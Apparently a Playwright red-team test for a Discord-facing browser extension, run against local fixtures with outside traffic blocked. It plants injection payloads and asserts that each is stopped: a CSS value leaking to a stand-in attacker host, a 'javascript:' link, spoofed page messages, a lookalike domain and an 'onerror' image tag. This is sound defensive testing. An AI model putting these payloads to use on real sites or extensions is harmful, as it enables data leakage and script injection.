import assert from 'node:assert/strict';
import {cp,mkdir,readFile,writeFile} from 'node:fs/promises';
import {createHash,generateKeyPairSync} from 'node:crypto';
import {resolve} from 'node:path';
import {chromium} from 'playwright';

// Only original local fixtures in an ephemeral browser profile. No account traffic.
const folder=resolve('.cache/red-team/browser-extension'),out=resolve('.cache/red-team/browser');
await mkdir(out,{recursive:true});await cp('dist/chromium',folder,{recursive:true});
const manifest=JSON.parse(await readFile(folder+'/manifest.json','utf8'));
assert.deepEqual(manifest.permissions,['storage']);assert.equal(manifest.externally_connectable,undefined);
assert.deepEqual(manifest.content_scripts[0].matches,['https://discord.com/channels/*']);
const key=generateKeyPairSync('rsa',{modulusLength:2048}).publicKey.export({type:'spki',format:'der'});
const id=[...createHash('sha256').update(key).digest().subarray(0,16)].map(b=>String.fromCharCode(97+(b>>4),97+(b&15))).join('');
manifest.key=key.toString('base64');await writeFile(folder+'/manifest.json',JSON.stringify(manifest));
const context=await chromium.launchPersistentContext('',{channel:'chromium',headless:true,serviceWorkers:'block',args:[`--disable-extensions-except=${folder}`,`--load-extension=${folder}`]});
const fixtureUrls=new Set(['https://discord.com/channels/@me','https://discord.com.evil.invalid/channels/@me','https://discord.com/login']);
const unexpectedRequests=[],errors=[];
context.on('page',page=>page.on('pageerror',e=>errors.push(e.message)));
await context.route(/^https?:\/\//,route=>{
 const url=route.request().url();
 if(fixtureUrls.has(url))return route.fulfill({contentType:'text/html',body:'<!doctype html><html><head><title>Controlled DSI adversarial fixture</title></head><body><main role="main"><div role="log"><p data-message-content>Local sample only.</p><a href="https://example.invalid/docs" title="Original">Local link</a></div></main></body></html>'});
 unexpectedRequests.push(url);return route.abort();
});
try{
 const page=await context.newPage();await page.goto('https://discord.com/channels/@me');
 const popup=await context.newPage();await popup.goto(`chrome-extension://${id}/popup.html`);await popup.waitForFunction(()=>!document.getElementById('safe-mode').disabled);
 const set=record=>popup.evaluate(async record=>chrome.storage.local.set({'dsiChat.plugins.settings.v2':record}),record);
 await set({version:2,enabled:{'larger-text':true,'link-destinations':true},plugins:{'larger-text':{size:'18px;}body{background:url(https://attacker.invalid/leak)}'}}});
 await page.waitForFunction(()=>document.querySelector('style[data-dsi-plugin="larger-text"]'));
 assert.equal(await page.locator('[data-message-content]').evaluate(e=>getComputedStyle(e).fontSize),'18px');
 assert.equal(await page.locator('style[data-dsi-plugin="larger-text"]').evaluate(e=>e.textContent.includes('attacker.invalid')),false);
 await page.locator('a').evaluate(e=>e.setAttribute('href','javascript:window.dsiAttack=1'));
 await page.waitForFunction(()=>document.querySelector('a').title==='Original');
 assert.equal(await page.evaluate(()=>window.dsiAttack),undefined);
 assert.equal(await page.evaluate(()=>typeof window.DSIPlugins),'undefined');
 assert.equal(await page.evaluate(()=>typeof window.chrome?.storage),'undefined');
 await set({version:2,safeMode:true,enabled:{'larger-text':true}});await page.waitForFunction(()=>document.querySelectorAll('style[data-dsi-plugin]').length===0);
 await page.evaluate(()=>{window.postMessage({kind:'dsi:plugin-status',safeMode:false,enabled:{'larger-text':true}},'*');document.dispatchEvent(new CustomEvent('dsi:plugin-status',{detail:{safeMode:false}}));});
 await page.waitForTimeout(250);assert.equal(await page.locator('style[data-dsi-plugin]').count(),0);
 await set({version:2,enabled:{'larger-text':true},plugins:{'larger-text':{size:28}}});await page.waitForFunction(()=>getComputedStyle(document.querySelector('[data-message-content]')).fontSize==='28px');
 for(const url of ['https://discord.com.evil.invalid/channels/@me','https://discord.com/login']){
  const wrong=await context.newPage();await wrong.goto(url);await wrong.waitForTimeout(500);assert.equal(await wrong.locator('style[data-dsi-plugin]').count(),0);await wrong.close();
 }
 await popup.evaluate(()=>{document.getElementById('plugin-filter').value='<img src=x onerror=window.dsiAttack=1>';document.getElementById('plugin-filter').dispatchEvent(new Event('input'));});
 assert.equal(await popup.evaluate(()=>window.dsiAttack),undefined);assert.equal(await popup.locator('#filter-result img').count(),0);
 assert.deepEqual(unexpectedRequests,[]);assert.deepEqual(errors,[]);
 await page.screenshot({path:out+'/fixture.png',fullPage:true});
 const report={actualExtension:true,cssInjectionBlocked:true,unsafeLinkNotExecuted:true,isolatedWorld:true,pageMessageSpoofIgnored:true,hostAndPathScope:true,filterMarkupNotExecuted:true,unexpectedRequests,liveDiscord:false};
 await writeFile(out+'/report.json',JSON.stringify(report,null,2)+'\n');console.log(JSON.stringify(report,null,2));
}finally{await context.close();}
